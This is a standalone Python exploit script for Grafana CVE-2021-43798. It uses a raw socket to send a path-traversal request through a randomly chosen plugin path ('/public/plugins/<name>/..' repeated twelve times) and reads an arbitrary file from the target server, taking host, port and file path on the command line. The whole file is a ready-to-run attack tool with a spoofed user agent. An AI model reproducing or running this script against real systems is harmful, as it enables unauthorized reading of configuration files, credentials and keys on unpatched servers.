"""
Grafana  CVE-2021-43798 without any external dependencies
"""


import re
import socket
from random import choice
import argparse
from time import sleep

VULN_PLUGINS = [
    "alertlist",
    "annolist",
    "barchart",
    "bargauge",
    "candlestick",
    "cloudwatch",
    "dashlist",
    "elasticsearch",
    "gauge",
    "geomap",
    "gettingstarted",
    "grafana-azure-monitor-datasource",
    "graph",
    "heatmap",
    "histogram",
    "influxdb",
    "jaeger",
    "logs",
    "loki",
    "mssql",
    "mysql",
    "news",
    "nodeGraph",
    "opentsdb",
    "piechart",
    "pluginlist",
    "postgres",
    "prometheus",
    "stackdriver",
    "stat",
    "state-timeline",
    "status-histor",
    "table",
    "table-old",
    "tempo",
    "testdata",
    "text",
    "timeseries",
    "welcome",
    "zipkin"
]

USER_AGENT = 'Opera/9.50 (Nintendo DSi; Opera/507; U; en-US)'



def run_exploit(target_url, target_port, target_file, **output_file):

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    DIR_STRING = ("/public/plugins/" + choice(VULN_PLUGINS) + "/.." * 12)
    try:
        print("Conneting To Server ")
        s.connect((target_url, int(target_port)))
        target_path = (DIR_STRING + target_file)
        print("Sending Request to http://{}:{}{}".format(target_url,
              target_port, target_path))
        request = "GET {} HTTP/1.1\r\nHost:{}\r\nUser-Agent:{}\r\n\r\n".format(
            target_path, target_url, USER_AGENT)
        s.send(request.encode())
        output_file = output_file['output_file']
        output_text = re.split(
            "Date:.*GMT", s.recv(8128).decode("utf-8"), maxsplit=1)[1]
        if not '{"message":"Plugin not found"}' in output_text:
            if output_file:
                try:
                    with open(output_file, "w", encoding="utf-8") as out_file:
                        out_file.write(output_text)
                        print("Saved output to ", output_file)
                        return
                except Exception as e:
                    print("Unable to write to file", output_file)
                    print(str(e))
                    return
            print(output_text)
        else:
            print("Failed to find plugin, retrying")
            sleep(1)
            run_exploit(target_url, target_port, target_file,
                        output_file=output_file)
    except Exception as e:
        print("Something Went Wrong, QUITING!")
        print(str(e))


def main():
    parser = argparse.ArgumentParser(
        description="Grafana CVE-2021-43798 (File Read Exploit)")
    parser.add_argument("-u", dest="target_url",
                        required=True, help="Target URL")
    parser.add_argument("-p", dest="target_port",
                        required=True, help="Target Port")
    parser.add_argument("-o", dest="output_file",
                        required=False, help="Output File")
    parser.add_argument("-f", dest="target_file",
                        required=True, help="Remote File To Read")
    args = parser.parse_args()

    try:
        if hasattr(args, "output_file"):
            run_exploit(args.target_url, args.target_port,
                        args.target_file, output_file=args.output_file)
        else:
            run_exploit(args.target_url, args.target_port, args.target_file)
    except KeyboardInterrupt:
        return


if __name__ == "__main__":
    main()
